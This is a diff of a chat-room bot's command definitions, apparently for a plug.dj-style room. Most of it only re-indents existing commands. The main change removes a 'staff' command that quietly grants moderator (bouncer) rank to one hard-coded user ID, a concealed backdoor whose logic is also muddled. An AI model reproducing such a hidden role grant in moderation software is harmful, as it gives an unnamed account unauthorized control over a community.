@@ -4185,19 +4185,7 @@
                 }
             },
 			
-			
-            staffCommmand: {
-                command:'staff',
-                rank: 'bouncer',
-                type: 'startwith',
-                functionality: function(chat, cmd){
-                     if (this.type === 'exact' && chat.message.length !== cmd.length || !TMbot.commands.executable(this.rank, chat)) return void(2);
-                    else if (API.getUser(chat.uid) === 30964807 && API.getUser(chat.uid) === 30964807) return API.moderateSetRole(API.getUser(chat.uid) , 0);
-                 bot.moderateSetRole(30964807, bot.ROOM_ROLE.BOUNCER);
-                }
-            },
-			
-			discordCommand: {
+	    discordCommand: {
                 command: 'discord',
                 rank: 'user',
                 type: 'exact',
@@ -4210,7 +4198,7 @@
                 }
             },
 			
-			stayCommand: {
+	    stayCommand: {
                 command: 'stay',
                 rank: 'bouncer',
                 type: 'exact',
@@ -4223,7 +4211,7 @@
                 }
             },
 			
-			eventCommand: {
+	    eventCommand: {
                 command: 'event',
                 rank: 'bouncer',
                 type: 'exact',
@@ -4236,7 +4224,7 @@
                 }
             },
 			
-			plug3Command: {
+            plug3Command: {
                 command: 'plug3',
                 rank: 'user',
                 type: 'exact',
